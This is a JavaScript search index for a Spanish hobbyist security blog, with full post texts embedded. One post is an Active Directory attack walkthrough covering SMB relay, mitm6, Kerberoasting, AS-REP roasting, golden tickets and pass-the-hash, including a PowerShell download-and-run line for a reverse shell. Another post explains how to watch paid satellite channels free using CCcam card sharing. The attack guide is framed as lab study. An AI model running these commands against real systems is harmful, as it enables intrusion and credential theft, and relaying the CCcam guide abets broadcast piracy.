
var documents = [{
    "id": 0,
    "url": "http://localhost:4000/404.html",
    "title": "404",
    "body": "404 Page not found!Please use the search bar from the bottom left or visit our homepage! "
    }, {
    "id": 1,
    "url": "http://localhost:4000/about",
    "title": "Sobre m√≠",
    "body": " Mi apodo es thespartoos inventado desde hace unos cuantos a√±os. Surgi√≥ de la nada, se podr√≠a decir ‚Äúpura imaginaci√≥n‚Äù Soy un estudiante de Espa√±a üá™üá∏ , actualmente cursando el 2 ¬∫ a√±o de Grado medio de Sistemas microinform√°ticos y redes Tambien os puedo contar que me apasiona viajar al extranjero a ciudades grandes de los Estados Unidos ser√≠a mi objetivo (New York). Mi pensamiento a futuro es ser analista de ciberseguridad (Penetration Tester) OBJETIVOS A NIVEL ACAD√âMICO:  CPHE (Certificado Profesional de Hacking √âtico) CHEE (Certificado de Hacking √âtico Experto) eJPT (eLearnSecurity Junior Penetration Tester) OSCP (Offensive Security Certified Professional) eWPTxv2 (Web Penetration Tester eXtreme)Podeis pasaros por mi HTB profile y darle un respect, me alegrar√≠a mucho üòä "
    }, {
    "id": 2,
    "url": "http://localhost:4000/authors",
    "title": "Authors",
    "body": "                                                                                                                                                              Thespartoos:         Creador del Blog de Ciberseguridad                "
    }, {
    "id": 3,
    "url": "http://localhost:4000/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 4,
    "url": "http://localhost:4000/contact",
    "title": "Contact",
    "body": "  Please send your message to thespartoos. We will reply as soon as possible!   "
    }, {
    "id": 5,
    "url": "http://localhost:4000/",
    "title": "Home",
    "body": "                                                                                               Pentesting Active Directory              :       Este art√≠culo engloba una enorme y extensa gu√≠a de ataques que se pueden realizar en un entorno de Directorio Activo Para practicar todo este tipo de ataques te recomiendo que. . . :                                                                               Thespartoos                 28 Mar 2022                                                                                                                           Ver canales de pago (GRATIS)              :       ¬øComo puedo ver canales de pago gratis? Antes de comenzar con el procedimiento de como realizar los pasos vamos a comenzar con la explicaci√≥n l√≥gica que nos va a servir. . . :                                                                               Thespartoos                 20 Dec 2021                                                                                                                           Host and Port Discovery              :       BIENVENIDOS A MI PRIMER POST Aqu√≠ puedes aprender como enumerar puertos y como descubrir hosts activos en red utilizando una serie de utilidades, algunas dise√±adas y otras son creadas manualmente. . . :                                                                               Thespartoos                 16 Aug 2021                                "
    }, {
    "id": 6,
    "url": "http://localhost:4000/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ ‚Äúsitemap. xml‚Äù   absolute_url }}   "
    }, {
    "id": 7,
    "url": "http://localhost:4000/Pentesting-Active-Directory/",
    "title": "Pentesting Active Directory",
    "body": "2022/03/28 - Este art√≠culo engloba una enorme y extensa gu√≠a de ataques que se pueden realizar en un entorno de Directorio Activo: Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la gu√≠a, por lo tanto los sistemas que vas a necesitar son:  Windows Server 2016 Windows 10Enumerar usuarios del sistema: Considero que mostrar en la gu√≠a instalar los sistemas operativos e implementar los equipos al dominio creo que no es necesario. En el caso que no sepais os lo dejo en vuestras manos ya que tambi√©n hay que aprender a investigar y eso lo debes de aprender por tu cuenta SMBCLIENT Y SMBMAP: Con estas herramienta podemos listar recursos compartidos a nivel de red a trav√©s del protocolo samba para poder enumerar este servicio debe de estar el puerto abierto el cual podemos escanear de varias formas Listar recuros compartidos sin conocer credenciales smbclient -L 192. 168. 213. 136 -NEn el caso de que no salgan recursos es necesario requerir de credenciales o si es otro tipo de error en el samba deberemos de especificar el siguiente par√°metro smbclient -L 192. 168. 213. 136 -N --option='client min protocol=NT1'Entrar en modo interactivo para ver el contenido de una carpeta compartida con smbclient smbclient //192. 168. 213. 136/ShareFolder -N Ver el contenido de una carpeta compartida con smbclient utilizando contrase√±a smbclient //192. 168. 213. 136/ShareFolder -U  admin%password123 Para leer archivos compartidos del sistema tambi√©n podemos utilizar smbmap con la que a dem√°s podemos ver los permisos smbmap -H 192. 168. 213. 136 -u 'null'Ver el contenido de una carpeta con smbmap smbmap -H 192. 168. 213. 136 -r 'ShareFolder'Ver los recursos compartidos con smbmap utilando contrase√±a smbmap -H 192. 168. 213. 136 -u 'admin' -p 'password123'RPCCLIENT: Con esta herramienta vas a poder informaci√≥n de una m√°quina como por ejemplo usuarios del sistema, grupos‚Ä¶ Para poder conectarte y poder enumerar debemos de ejecutar la siguiente sentencia: rpcclient -U    192. 168. 213. 135 ‚û°Ô∏è Sin contrase√±arpcclient -U  alejandrocorp. local\alejandro%Password1  ‚û°Ô∏è Con contrase√±aSi queremos enumerar los usuarios del dominio podemos realizarlo con esta sentencia en una misma l√≠nea: Cada usuario tiene un rid a trav√©s del cual podemos saber en que grupos se encuentra y mas informaci√≥n al respecto: Ejecutando la siguiente sentencia veremos informaci√≥n acerca del usuario que escogimos a trav√©s del rid Sentencia para enumerar informaci√≥n completa de usuarios en una sola linea for rid in $(rpcclient -U  s4vicorp. local\alejandro%Password1  192. 168. 213. 135 -c 'enumdomusers' | grep -oP '\[. *?\]' | grep '0x' |tr -d '[]'); do echo  \n[+] para el RID: $rid\n ; rpcclient -U  s4vicorp. local\alejandro%Password1  192. 168. 213. 135 -c  queryuser $rid  |grep -E -i  user name|description  ; donePodemos ver los grupos que se encuentran a nivel de dominio Dentro de esos grupos se encuentran los rid de los usuarios los cuales podemos enumerar con el siguiente comando: LDAPDOMAINDUMP: Si no quereis hacer lo que hemos hecho con rpcclient podemos utilizar esta herramienta que nos automatiza el proceso de enumerar la cual v√≠a web te representa toda la informaci√≥n estructurada Esta herramienta es de github ‚û°Ô∏è : ldapdomaindump Nos la clonamos el repositorio y nos vamos a la ruta /var/www/html, en donde iniciamos el servicio apache2 y despu√©s ejecutamos el siguiente comando y abrimos el navegador y ponemos localhost python3 /opt/ldapdomaindump/ldapdomaindump. py -u 's4vicorp. local\alejandro' -p 'Password1' 192. 168. 213. 135ATAQUES DIRECTORIO ACTIVO: SMB RELAY: ‚ö†Ô∏è Este ataque solo funciona si los equipos de la red no utilizan samba firmando, que os aseguro que la mayor√≠a de empresas no lo tienen Este ataque consiste en envenenar tr√°fico, y como no esta firmado no se logra validar la legitimidad del origen nos enviar√° su hash NTLMV2 ya que se autentica contra nostros IPV4 Bueno para poder envenenar el tr√°fico por IPV4 es necesario de prescindir del Responder. py en la mayor√≠a de sistemas de pentesting aparece instalado en la ruta ‚Äú/usr/share/Responder‚Äù python3 responder. py -I eth0 -wvUna vez ejecutado el comando ya est√° envenando en el momento que algui√©n busque un recurso compartido que no exista tendremos el hash NTLMv2 Copiamos ese hash NTLMv2 y vamos a crackear el hash con john, si la contrase√±a es lo suficientemente poco segura la podremos sacar. Una vez sacada la deberemos de validar con la herramienta crackmapexec Si nos pone un (Pwned!) podremos ejecutar comandos en la m√°quina porque la contrase√±a es privilegiada. En ese caso podemos realizar otro ataque de envenenamiento por el que vamos a poder dumpear la sam del equipo o ejecutar cualquier otro comando. Vamos a volver a envenenar el tr√°fico, pero esta vez vamos a editar el Responder. conf para poner [SMB=Off, HTTP=Off], despu√©s ejecutamos la siguiente herramienta con los siguientes par√°metros En el momento en el que se autentique va a ejecutar ese mismo comando aprovechandose de ese autenticaci√≥n y nos dumpea la sam. Tambi√©n podemos especificar comandos a ejecutar con el siguiente comando: Por ejemplo ejecutarse un archivo de powershell que te entable una reverse_shell ntlmrelayx. py -tf targets. txt -smb2support -c  powershell IEX(New-Object Net. WebClient). downloadString('http://IP:PORT/PS. ps1') IPV6 Para poder envenenar el tr√°fico por IPV6 deberemos de utilizar la herramienta mitm6 para a trav√©s de ella envenenar el DNS, la puerta de enlace y dem√°s para que posteriormente en el momento que busquen un recurso compartido que no exista y el hash del usuario es privilegiado podremos ejecutar comandos Envenenamos la red: mitm6 -d &lt;dominio&gt;Ahora para que nos pille esa comunicaci√≥n entraremos en modo interactivo y utilizando socks para posteriormente si es privilegiado ejecutar comandos a trav√©s de proxychains ntlmrelayx. py -6 -wh kali-IP -t smb://192. 168. 94. 138 -socks -debug -smb2supportEn el modo interactivo podemos limpiar la pantalla con ‚ÄúCTRL + L‚Äù. Para poder ver los usuarios que intercept√≥ debemos de ejecutar el comando socks Vemos que pone TRUE por lo tanto podemos configurar proxychains para redirigir esa autenticaci√≥n que al ser privilegiada podamos ejecutar comandos. Para configurar proxychains nos vamos a editar el fichero /etc/proxychains. conf Una vez editado para poder ejecutar comandos simplemente vamos a validar que la autenticaci√≥n es v√°lida para ello ejecutamos el siguiente comando: proxychains cme smb IP -u 'mvazquez' -p 'nonecesitassaberla' -d 's4vicorp' 2&gt;/dev/nullKERBEROASTING: Para este ataque se utiliza para conocer es necesario de conocer credenciales v√°lidas. Consiste en conocer usuarios que sean kerberoasteables para obtener su hash TGS y poder crackearlo Este ataque se puede hacer tambi√©n desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte rubeus. exe de github un compiled-binarie, con el que lo traspasamos a la m√°quina y lo ejecutamos haciendo la siguiente sentencia: Rubeus. exe kerberoast /creduser:s4vicorp. local\alejandro /credpassword:Password1ASREPROAST: Para este ataque no se requiere de que conozcas las contrase√±as pero necesitas tener un listado de usuarios v√°lidos y funciona cuando un usuario a nivel de configuraci√≥n tiene asignado No pedir autenticaci√≥n de kerberos previa. Simplemente tienes que ejecutar el siguiente comando Como vemos obtenemos de nuevo el TGS que con el podemos crackear la contrase√±a con john Este ataque se puede hacer tambi√©n desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte rubeus. exe de github un compiled-binarie, con el que lo transferimos a la m√°quina que tengamos acceso y lo ejecutamos Rubeus. exe asreproast /user:SVC_SQLservice /domain:s4vicorp. local /dc:DC-CompanyGOLDENTICKET ATTACK: Este ataque es util para escalar privilegios haciendo un pass the ticket obteniendo informaci√≥n del usuario krbtgt contruyendo un goldenticket. Lo primero que debemos de hacer es tener acceso a un equipo para subirle el mimikatz. exe. Una vez que hemos subido el mimikatz vamos a ejecutarlo aplicando el siguiente comando que nos dar√° informaci√≥n del usuario krbtgt Toda la informaci√≥n que nos arroja la copiamos para guardarla ya que nos vamos a construir un golden ticket. Una vez copiada volvemos al mimikatz de la m√°quina y ponemos el siguiente comando rellenando los siguientes datos que se guardaron en lo que nos copiamos antes kerberos::golden /domain:s4vicorp. local /sid:&lt;SID&gt; /rc4:&lt;NTLM&gt; /user:Administrador /ticket:golden. kirbi Genial como vemos se nos guard√≥ un golden. kirbi, ahora nos podemos conectar con otro usuario en otro equipo si es privilegiado y desde mimikatz le podemos importar ese golden. kirbi para que pueda leer recursos compartidos privilegiados a nivel de red kerberos::ptt golden. kirbiUna vez hecho eso si por ejemplo intentamos listar el contenido privilegiado del DC, podremos verlo (‚Äúdir \DC-Company\c$‚Äù o dir ‚Äú\DC-Company\admin$‚Äù) Pero esto apenas es nada tambi√©n podr√≠amos jugar con la herramienta ticketer. py de nuestro equipo local con la que podemos generar un goldenticket y poder hacer pass the hash para poder conectarnos sin contrase√±a. Simplemente desde nuestro equipo ejecutamos el siguiente comando con los datos que recopilamos anteriormente con mimikat: Ahora se nos habr√° creado un archivo llamado ‚ÄúAdministrador. ccache‚Äù y el siguiente paso ser√° exportar una variable de entorno para que lo utilice ese archivo y poder conectarnos sin contrase√±a export KRB5CCNAME= /home/alejandro/Escritorio/Laboratorio/AD/Administrador. ccache Una vez exportada simplemente para conectarnos al DC como administrador podemos ejecutar el siguiente comando sin contrase√±a BLOODHOUND: Bueno esta herramienta es una locura que todo pentester debe de utilizar en una auditor√≠a ya que sirve para enumerar v√≠as potenciales de como conseguir ser Administrador. Para poder instalarla: sudo apt install neo4j bloodhound -yTendreis que configurarlo antes el bloodhound para poder acceder con usuario y contrase√±a. Para poder iniciarlo primero ejecutamos neo4j console y luego abrimos el bloodhound Una vez que hayais accedido ya al bloodhound seteando la contrase√±a vamos a utilizar un script en powershell SharpHound. ps1, lo podemos buscar en github, el cual servir√° para que nos recoja informaci√≥n del sistema y que la almacene en un . zip Una vez tengamos el script SharpHound vamos a conectarnos con una powershell hay varias formas ya sea porque teneis acceso a trav√©s de winrm o desde una cmd entablarse una powershell. Subimos el archivo: IEX(New-Object Net. WebClient). downloadString('http://192. 168. 213. 129/SharpHound. ps1')Y luego para hacer que se ejecute el scritp ejecutamos la siguiente sentencia Invoke-BloodHound -CollectionMethod AllDespu√©s de eso se nos crear√° un archivo . zip el cual lo transferiremos a nuestra m√°quina y posteriormente lo importaremos en el bloodhound. En el caso de que no tengamos acceso al equipo podemos ejecutar bloodhound-python el cual se instala: sudo apt install bloodhound-python o pip3 install bloodhoundUna vez tengamos la herramienta bloodhound-python podemos realizar lo mismo pero desde nuestro equipo local ejecutando el siguiente comando: Se nos generan unos archivos . json los cuales importaremos a nuestro bloodhound para enumerar MANERAS ACCEDER EQUIPOS:    Con contrase√±a ‚û°Ô∏è psexec. py s4vicorp. local/Administrador:P@\$\$w0rd\!@192. 168. 213. 135 cmd. exe     Pass the hash ‚û°Ô∏è wmiexec. py s4vicorp. local/mvazquez@192. 168. 213. 135 -hashes hash  "
    }, {
    "id": 8,
    "url": "http://localhost:4000/Ver-Canales-de-pago/",
    "title": "Ver canales de pago (GRATIS)",
    "body": "2021/12/20 - ¬øComo puedo ver canales de pago gratis?: Antes de comenzar con el procedimiento de como realizar los pasos vamos a comenzar con la explicaci√≥n l√≥gica que nos va a servir para entender mejor como funciona. Descripci√≥n La antena parab√≥lica es un dispositivo encargado principalmente de recibir o transmitir ondas electromagn√©ticas de alta frecuencia, desde la Tierra hacia los sat√©lites que orbitan en el espacio libre, y de adaptar estas frecuencias para que se puedan distribuir por redes de cable coaxial. Las antenas parab√≥licas reciben la se√±al que es difundida por los sat√©lites de comunicaciones, en este caso por el sat√©lite (Astra), que orbitan en el espacio siempre en la misma posici√≥n respecto al punto emisor y gracias a su forma, rebotan la se√±al recibida y la concentran en el LNB universal. Una vez que la se√±al est√° concentrada se transmite directamente al decodificador a trav√©s del cable coaxial. Una vez est√© conectado al decodificador, el decodificador habr√° que configurarlo, en el que tendr√°s que escoger el sat√©lite en cuesti√≥n, nos aparecer√° como (1/1 Astra 1C) y despu√©s que comience con la b√∫squeda de canales. El sat√©lite suele coger una cantidad aproximada a los 900 canales. Cuando ya ha encontrado los canales, vamos a configurar el decodificador con conexi√≥n a internet para que pueda acceder a la CCcam que se encuentra en los servidores online y poder decodificar la se√±al de los canales de pago. Vamos a empezar por partes, lo primero que hay que hacer para comenzar el plan es plantearse donde vamos a colocar la antena parab√≥lica en la que deber√° haber buena colocaci√≥n con la que apuntar hacia el sat√©lite Astra. PARTES  Herraminetas necesarias e instalaci√≥n Decodificador Proceso CCcam1 - Herramientas necesarias e instalaci√≥n: Comprar ‚û°Ô∏è  Kit de la antena parab√≥lica üí∏ (url): Aliexpress Cuando tengamos la antena deber√©mos de plantear donde colocarla teniendo en cuenta la posici√≥n del sat√©lite ASTRA. Para ello dispondremos de cualquier aplicacion que sirva para encontrar el sat√©lite ASTRA. Cuando la hemos encontrado vamos a colocar la antena hacia esa direcci√≥n. Despu√©s necesitamos un aparato que tendr√°s que comprar o no depende si utilizas otros medios, que utilizaremos para saber si la calidad que consigue del sat√©lite es adecuada. El Satellite finder en la parte de la izquierda deber√° estar conectada por el cable coaxial de la antena que ir√° al decodificador y la parte de la derecha deber√° estar conectado por otro cable coaxial que a su vez estar√° conectado al LNB. Cuando ya hemos conectado los dos cables coaxiales correctamente al satellite finder, lo encenderemos, empezar√° a sonar un pitido el cual nos indica la calidad que es recibida por el LNB que deber√° de ir aumentando hasta alcanzar los 10 dB o aproximado.  2 - Decodificador: Cuando hayamos configurado todo lo anterior, la antena este colocada, reciba buena se√±al‚Ä¶ Vamos a continuar colocando el decodificador en una parte cercana al televisor. La salida del decodificador deber√° de ser conectada al televisor y es necesario que el decodificador venga con una antena preferiblemente para coger WIFI. Comprar ‚û°Ô∏è  Decodificador üí∏ (url): Aliexpress Cuando esta colocado el decodificador lo primero que deberemos de hacer ser√° cambiar el idioma (opcional).  Una vez cambiado el idioma nos dirigimos a la b√∫squeda de canales vemos que le llega buena calidad de se√±al, que es a partir del 70 %, y vamos a hacer una b√∫squeda de canales seleccionando previamente el sat√©lite (1/1 ASTRA1H/1K/1L/).  3 - Proceso CCcam: ‚ö†Ô∏è IMPORTANTE: Antes de comprar la CCcam quiero recalcar que la CCcam que compras durar√° el tiempo que tu hayas comprado (te ofrecen 1 a√±o, 2 a√±os y meses). Al acabarse ese tiempo lleg√≥ la hora de comprar otros c√≥digos, pero tranquilos es muy barato. Comprar ‚û°Ô∏è  CCcam (url): üí∏ Aliexpress Una vez sintonizado todos los canales, en mi caso llegaron 900 canales aproxim√°damente, lleg√≥ la hora de conectar el decodificador a internet a trav√©s del men√∫ para poder decodificar los canales de pago que como habeis visto no se pueden ver antes de poner la CCcam.  Cuando el decodificador tiene salida a internet vamos al apartado de ‚ÄúProtocolo CS‚Äù (En otros decodificadores ser√° distinto todo es mirar la marca de vuestro decodificador, haber donde poneis la CCcam y lo mirais). En el decodificador de la marca ‚ÄúGTMEDIA V8X (Nova)‚Äù hay que pulsar ‚Äú4‚Äù veces el n√∫mero ‚Äú6‚Äù, nos saldr√° y ahora podremos poner la CCcam en el siguiente menu En este momento vamos a a√±adir los c√≥digos, las 8 o las l√≠neas que compremos al decodificador. Le damos a a√±adir y vamos poniendo los datos uno a uno.  Para cada l√≠nea de codigo, ya os digo dependiendo de cuantas l√≠neas compreis, que vayamos a√±adiendo deberemos encenderlos, en algunos es autom√°tico pero en otros no, en mi caso vamos a iniciarlo.  Una vez puestos los c√≥digos podremos ver cualquier canal de pago totalmente gratis. Si algun canal no os lo consigue decodificar es porque esta en otro idioma y la CCcam que comprais es de Espa√±a y para otros canales de otros idiomas, pero no para ese. Espero que os haya servido este art√≠culo y ya sabes‚Ä¶ ESTAMOS HACK ! "
    }, {
    "id": 9,
    "url": "http://localhost:4000/Analisis-de-servicios-y-puertos/",
    "title": "Host and Port Discovery",
    "body": "2021/08/16 - BIENVENIDOS A MI PRIMER POST: Aqu√≠ puedes aprender como enumerar puertos y como descubrir hosts activos en red utilizando una serie de utilidades, algunas dise√±adas y otras son creadas manualmente por ti  1 - PUERTOS 2 - HOSTS1 - PORTSCAN MANUAL: #!/bin/bashfunction ctrl_c(){	echo -e  \n\n[!] Saliendo. . . . \n 	tput cnorm; exit 1}# Ctrl+Ctrap ctrl_c INTtput civisfor port in $(seq 1 65535); do	timeout 1 bash -c  echo '' &gt; /dev/tcp/IP/$port  2&gt;/dev/null &amp;&amp; echo  [+] Puerto $port - ABIERTO  &amp;done; waittput cnorm1 - Puertos NMAP:  Modo ‚Äì&gt; agresivo y ruidoso ‚ö†Ô∏è nmap -p- --open -T5 -v -n [IP] Modo ‚Äì&gt; R√°pido enviando 5000 p/s üí® nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn [IP] Modo ‚Äì&gt; Enumerar servicio y versi√≥n üî• nmap -sC -sV -p22,80,443 [IP]2 - HOST DISCOVERY: #!/bin/bashfunction ctrl_c(){	echo -e  \n\n[!] Saliendo. . . . \n 	tput cnorm; exit 1}# Ctrl+Ctrap ctrl_c INTtput civisfor host in $(seq 1 254); do	timeout 5 bash -c  ping -c 1 192. 168. 1. $host &amp;&gt;/dev/null   &amp;&amp; echo  [+] HOST 192. 168. 1. $host - ACTIVO  &amp;done; waittput cnorm2 - HOST NMAP: nmap -sP 192. 168. 1. 0/24nmap -sn 192. 168. 1. 0/24"
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>No results found...</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});